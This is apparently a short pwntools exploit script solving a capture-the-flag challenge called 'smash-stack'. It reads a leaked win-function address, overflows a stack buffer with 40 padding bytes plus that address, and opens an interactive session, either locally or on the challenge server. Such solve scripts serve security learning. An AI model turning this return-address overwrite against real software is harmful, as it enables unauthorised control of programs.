#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./vuln"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("smash-stack.cpctf.space", 30005)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b main
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

p.recvuntil(b"win: ")
win_addr = eval(p.recvline())
log.info("win: {}".format(hex(win_addr)))

payload = b""
payload += b"A" * 0x8 * 5
payload += p64(win_addr)

sleep(0.5)
p.sendline(payload)

p.interactive()
